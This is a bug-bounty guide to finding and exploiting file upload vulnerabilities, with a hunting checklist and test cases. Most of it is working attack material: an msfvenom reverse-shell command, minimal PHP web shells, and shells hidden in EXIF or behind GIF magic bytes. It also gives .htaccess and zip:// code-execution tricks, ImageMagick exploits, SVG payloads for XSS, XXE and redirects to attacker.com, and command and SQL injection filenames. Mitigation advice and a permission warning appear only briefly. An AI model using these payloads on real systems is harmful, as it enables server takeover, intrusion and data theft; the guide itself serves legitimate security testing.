# File Upload Vulnerabilities

File upload features let end-users send files that a server stores, processes, or serves back to others. When validation is weak or absent, an attacker can upload a file with malicious code that executes on the server or renders in another user's browser. This is one of the highest-impact bug classes: worst case is Remote Code Execution / reverse shell (Critical), but it also yields stored XSS, SSRF, XXE, LFI, phishing and DoS. Allowing uploads without fully understanding the risk is akin to opening the floodgates for server compromise, and unrestricted upload mechanisms remain common in modern applications. (Tip: read the first reference below — it's a great blog — then proceed.)

## Hunting Checklist

1. Browse the site and enumerate every upload functionality: profile pictures/avatars, attachments, feedback forms, import/export (CSV/Excel), resume portals, comment attachments, API multipart endpoints.
2. Note where each file is stored and served: same origin? CDN/subdomain? Predictable path? Rendered inline (`<img src>`) or forced as download?
3. Baseline test: try uploading a web shell directly.
   ```bash
   weevely generate <password> <path>
   # OR
   msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.8 lport=4444 -f raw
   ```
4. If rejected, identify which validation layer blocked you and work through them in order: client-side → file name/extension (black/whitelist) → Content-Type/MIME → Content-Length → file header/magic bytes → file content (polyglots, PNG IDAT, EXIF metadata).
5. Try secondary surfaces: configuration file uploads (`.htaccess`, `web.config`), archives (`.zip` — Zip Slip / stream wrappers), and "Upload from URL" (SSRF).
6. Test filename-based injections for other bug classes: XSS, SQLi, path traversal/LFI, command injection, parameter pollution.
7. If the app processes images, test the image handler itself (ImageMagick — see Test Case 9).
8. On success: upload a small POC first, then escalate only within scope (e.g. look for DB credentials) and document impact.

## Validation Types (Background)

There are several others (file signature, content validation, storage location), but the main five:

1. **Client-Side Validation** — happens in the browser via JavaScript, VBScript or HTML5 attributes before the input reaches the server, usually for UX. Example error: `Only .jpg is allowed`. Trivially bypassed with a proxy.
2. **File Name Validation** — server checks the extension, via **blacklisting** (reject specific extensions such as `php`, `aspx`) or **whitelisting** (only allow a few, such as `jpg`, `jpeg`, `gif`).
3. **Content-Type / MIME-Type Validation** — server checks the `Content-Type` sent in the HTTP request (e.g. `Content-type: image/png`). Attacker-controlled.
4. **Content-Length Validation** — server restricts the maximum upload size (e.g. `Not allow file size greater than 10 bytes`). Less common.
5. **Checking the Image Header** — image-only uploads often validate the header with a server-side function such as PHP's `getimagesize()`, which returns FALSE for non-images. Bypassed with magic numbers — see [List of file signatures - Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures).

## What You Can Achieve & Extension Impact

**Outcomes of a successful file-upload exploit:** Remote Code Execution, SSRF, XSS, LFI, XXE, Phishing, Parameter pollution, internal path disclosure from uploaders, [SQL injection](https://security.stackexchange.com/questions/29014/are-image-uploads-also-vulnerable-to-sql-injection), DoS — and many more.

**Extension impact cheat sheet:**

- `ASP`, `ASPX`, `PHP5`, `PHP`, `PHP3`: Webshell, RCE
- `SVG`: Stored XSS, SSRF, XXE
- `GIF`: Stored XSS, SSRF
- `CSV`: CSV injection
- `XML`: XXE
- `AVI`: LFI, SSRF
- `HTML`, `JS`: HTML injection, XSS, Open redirect
- `PNG`, `JPEG`: Pixel flood attack (DoS)
- `ZIP`: RCE via LFI, DoS
- `PDF`, `PPTX`: SSRF, blind XXE
- `SCF`: RCE

## Test Cases & Examples

![File upload mindmap](https://blog.yeswehack.com/wp-content/uploads/mindmap.png.webp)

### Test Case 1: Blacklisting Bypass

1. Capture the upload request and send it to Repeater.
2. Probe which extensions are blacklisted by changing the `filename=` parameter:

```http
POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php
```

3. Try alternate extensions:

```text
PHP        → .phtm, .phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc
ASP        → .asp, .aspx, .cer, .asa
JSP        → .jsp, .jspx, .jsw, .jsv, .jspf
Coldfusion → .cfm, .cfml, .cfc, .dbm
Random capitalization → .pHp, .pHP5, .PhAr
```

Find more in PayloadsAllTheThings and https://book.hacktricks.xyz/pentesting-web/file-upload

4. If successful, exploit further; otherwise other validation layers exist — continue with the other bypasses.

### Test Case 2: Whitelisting Bypass

Send whitelisted-looking names that still get parsed/executed:

```text
file.jpg.php
file.php.jpg
file.php.blah123jpg
file.php%00.jpg
file.php\x00.jpg   (can also be done while uploading: name it file.phpD.jpg and change the D (44) in hex to 00)
file.php%00
file.php%20
file.php%0d%0a.jpg
file.php.....
file.php/
file.php.\
file.php#.png
file.
.html
```

If none work, fuzz the `filename=` extension with Burp Intruder to find what is accepted, then retry. Combined requests look like:

```http
POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.jpg"
Content-Type: application/x-php
```

### Test Case 3: Content-Type Validation

Upload `file.php` but rewrite the part header to an allowed image type (`image/png`, `image/gif`, `image/jpg`) or `application/octet-stream`:

```http
POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: image/png
```

### Test Case 4: Content-Length Validation

If size is checked, shrink the payload until it fits. Minimal shells:

```php
<?= `$_GET[x]` ?>
<?= 'ls';
```

Note: `<?` short tags work when `short_open_tag=On` in php.ini (default=On). Successful request:

```http
POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

<?= `$_GET[x]` ?>
```

Then access the file, e.g.:

```http
GET /compromised_file.php?x=cat%20%2Fetc%2Fpasswd HTTP/1.1
Host: example.com
```

Don't stop here — upload a better shell and look for more critical material like DB credentials.

### Test Case 5: Content Bypass Using Magic Bytes

Set `Content-Type: image/gif` and prepend the magic bytes before the shell code:

```http
POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: image/gif

GIF89a; <?php system($_GET['cmd']); ?>
```

Try more signatures from https://en.wikipedia.org/wiki/List_of_file_signatures and change the Content-Type accordingly.

### Test Case 6: Magic Bytes & Metadata Shell (EXIF)

1. Bypass Content-Type checks by setting it to `image/png`, `text/plain` or `application/octet-stream`.
2. Inject the shell into image metadata with exiftool:

```bash
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
```

3. Upload the modified `img.jpg` and exploit further.

### Test Case 7: Uploading Configuration Files

- If the app runs Apache/PHP, try uploading `.htaccess`; you can configure several things and even execute code. Different shells: https://github.com/wireghoul/htshells
- If the app runs IIS/ASP, try uploading `.config` (web.config). One trick appends code inside an HTML comment: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config — more on https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
- Example: after uploading an `.htaccess` containing `AddType application/x-httpd-php .png`, Apache executes PNG images as PHP scripts — then upload your PHP shell with a `.png` extension.

### Test Case 8: Zip Slip / Archive Upload

1. Check whether `.zip` is accepted.
2. Upload `.php` compressed into `.zip`, then try:

```http
GET /path?page=zip://path/file.zip%23rce.php HTTP/1.1
Host: site.com
```

Tool and info: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Zip%20Slip

### Test Case 9: ImageMagick

References: https://hackerone.com/reports/302885 , https://medium.com/@kunal94/imagemagick-gif-coder-vulnerability-leads-to-memory-disclosure-hackerone-e9975a6a560e

1. Find an image-processing upload (e.g. profile pic).
2. Build the generator:

```bash
git clone https://github.com/neex/gifoeb
cd gifoeb
./gifoeb gen 512x512 dump.gif
```

This creates an exploitable `dump.gif` (512x512 = pixel dimensions). To bypass some checks, also generate:

```bash
./gifoeb gen 1123x987 dump.jpg
./gifoeb gen 1123x987 dump.png
./gifoeb gen 1123x987 dump.bmp
./gifoeb gen 1123x987 dump.tiff
./gifoeb gen 1123x987 dump.tif
```

3. Upload the modified image from profile settings; the server returns resized pixel files. Download them and recover:

```bash
for p in previews/*; do
    ./gifoeb recover $p | strings;
done
```

More details: https://github.com/neex/gifoeb

**Another method (SSRF via MVG)** — references: https://www.exploit-db.com/exploits/39767 , https://hackerone.com/reports/135072

1. Create `ssrf.mvg`:

```text
push graphic-context
viewbox 0 0 640 480
fill 'url(http://example.com/)'
pop graphic-context
```

Here `example.com` is your Burp Collaborator URL or a site where you can receive HTTP requests.

2. Convert and upload:

```bash
convert ssrf.mvg out.png
```

3. Upload the image and check for the inbound request. Ready-made payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20Image%20Magik

### Exploitation Outcomes

**XSS** — multiple ways:

1. Malicious filename: `filename="svg onload=alert(document.domain)>"` or `filename="58832_300x300.jpg<svg onload=confirm()>"`
2. Via `.gif`:

```text
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
```

3. Via `.svg`:

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert("HolyBugx XSS");
   </script>
</svg>
```

**Open Redirect** — via `.svg`:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='https://attacker.com'"
xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
</svg>
```

**XXE** — via `.svg`:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="40" x="0" y="16">&xxe;</text>
</svg>
```

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```

Excel/XML import files can also yield XXE and other issues: https://medium.com/@rezaduty/security-issues-in-import-export-functionality-5d8e4b4e9ed3

**SSRF**:

1. Abuse "Upload from URL" — if the image is saved to a public page, point it at [IPlogger](https://iplogger.org/invisible/) to collect visitor data.
2. Via `.svg`:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><image height="200" width="200" xlink:href="https://attacker.com/picture.jpg" /></svg>
```

**Command Injection** — filename: `; sleep 10;`

**LFI / Path Traversal** — filenames: `../../etc/passwd/logo.png`, `../../../logo.png` (may overwrite the site logo).

**SQL Injection** — filenames: `'sleep(10).jpg`, `sleep(10)-- -.jpg`

**DoS**:

1. Pixel flood — upload https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/malicious-images/lottapixel.jpg (see also https://hackerone.com/reports/390)
2. Oversized filename: `1234...99.png`

**SSTI** — if the filename or stored content is later rendered through a template (emails, previews), test template syntax in the content/name, e.g. `{{7*7}}`.

## Bypass Techniques

*(Consolidated from the former "Bypassing File Uploads" note plus community tips.)*

- **Confusing extension-only checks** — if the server only validates the extension string, files like `something.php.jpg` or `something.jpg.php` may be accepted (see Test Case 2 for the full list). If a PHP file lands and gets parsed, it's game over: web shell → RCE or reverse shell.
- **Bypassing magic-byte validation with polyglots** — polyglots are files valid as multiple formats: a GIFAR is both GIF and RAR; others are GIF+JS, PPT+JS, or PHAR+JPEG. A PHAR-JPEG carries a valid JPEG header (passes image checks) plus PHP payload that can be used for exploitation once processed. Also see [Encoding Web Shells in PNG IDAT chunks](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/).
- **Path traversal on upload** — filename:

```text
../test.png
..%2Ftest.png
```

- **How the classic bypass works:**
  1. Create a malicious file with an extension that is accepted by the application.
  2. Upload it and intercept the request.
  3. Edit the filename to the malicious extension you want; in some cases also change the Content-Type.
  4. Forward the request.
- **WAF bypass** (tip by @0xInfection, case: `.php` blocked):

```http
GET /?file=xx.php HTTP/1.1     <- Blocked
GET /?file===xx.php HTTP/1.1   <- Bypassed (file uploaded successfully)
```

- **Filter bypass combo**:

```bash
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' shell.jpg
mv shell.jpg shell.php.jpg
```

- **PDF uploads** — test malicious PDF handling (in your own lab first): https://github.com/jonaslejon/malicious-pdf

![WAF bypass example 1](https://pbs.twimg.com/media/EpkPLYXVgAMLhZa?format=jpg&name=medium)
![WAF bypass example 2](https://pbs.twimg.com/media/Eq9dOoaXUAAEE8n?format=jpg&name=900x900)

> Uploading a shell to a random website for fun is not cool — never test without permission.

## Mitigation

File upload is not straightforward to implement securely. Recommendations:

- Use a server-generated filename if storing uploaded files on disk.
- Inspect content and enforce a whitelist of accepted, non-executable content types; additionally blacklist common executable formats to hinder hybrid file attacks.
- Enforce a whitelist of accepted, non-executable file extensions.
- If files are downloaded by users, send an accurate non-generic `Content-Type`, `X-Content-Type-Options: nosniff`, and a `Content-Disposition` header forcing attachment handling.
- Enforce a size limit (both application code and web server config, for defense-in-depth).
- Reject archive formats such as ZIP.

## Tools & Resources

**Tools:**

- [almandin/fuxploider](https://github.com/almandin/fuxploider)
- [PortSwigger/upload-scanner](https://github.com/PortSwigger/upload-scanner)
- [barrracud4/image-upload-exploits](https://github.com/barrracud4/image-upload-exploits)
- [neex/gifoeb](https://github.com/neex/gifoeb)
- [wireghoul/htshells](https://github.com/wireghoul/htshells)
- [PayloadsAllTheThings — Insecure File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)

**Mind-Map:**

![File_Upload_MindMap](https://user-images.githubusercontent.com/33719912/193826710-b6d71979-04f4-42a6-a9c6-7d14784de9d4.png)

**References:**

- [Interesting Test Cases of File Uploading Vulnerabilities](https://akash-venky091.medium.com/interesting-test-cases-of-file-uploading-vulnerabilities-3ad47f9e6149)
- [File upload tricks and checklist (OnSecurity)](https://www.onsecurity.io/blog/file-upload-checklist)
- [File Upload Attacks Part 1 (YesWeHack)](https://blog.yeswehack.com/yeswerhackers/exploitation/file-upload-attacks-part-1/)
- [Unrestricted File Upload in PHP](https://medium.com/@nyomanpradipta120/unrestricted-file-upload-in-php-b4459eef9698)
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [Exploit-DB: File Upload Restrictions Bypass (PDF)](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)
- [File Upload Bypass (PDF, Harshit Sengar)](https://harshitsengar.in/resources/File%20Upload%20Bypass%20.pdf)
- [Comprehensive Guide on Unrestricted File Upload](https://www.hackingarticles.in/comprehensive-guide-on-unrestricted-file-upload/)
- [HolyBugx/HolyTips File Upload Checklist](https://github.com/HolyBugx/HolyTips/blob/main/Checklist/File%20Upload.md)
- [Exploiting file upload vulnerabilities](https://infosecwriteups.com/web-application-analysis-exploiting-file-upload-vulnerabilities-cf48f79d51e)
- [OWASP Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [Art of Unrestricted File Upload Exploitation](https://bugdisclose.medium.com/art-of-unrestricted-file-upload-exploitation-92ed28796d0)
- [HackTricks: File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)

## Report Tips

- Prove execution safely and minimally (e.g. `phpinfo()` or a `whoami` echo, no destructive commands); an uploaded-but-not-executed shell is usually still a valid finding — frame it as potential RCE with the parse condition.
- Rank impact by what the server does with the file: same-domain parsed script → Critical (RCE); SVG served inline → High (stored XSS/phishing on trusted origin); archive/DoS/path disclosure → informational/low unless chained.
- Include the exact request that bypassed validation and the mitigation from the section above — it speeds triage and duplicate matching.

## Author

[KathanP19](https://twitter.com/KathanP19)
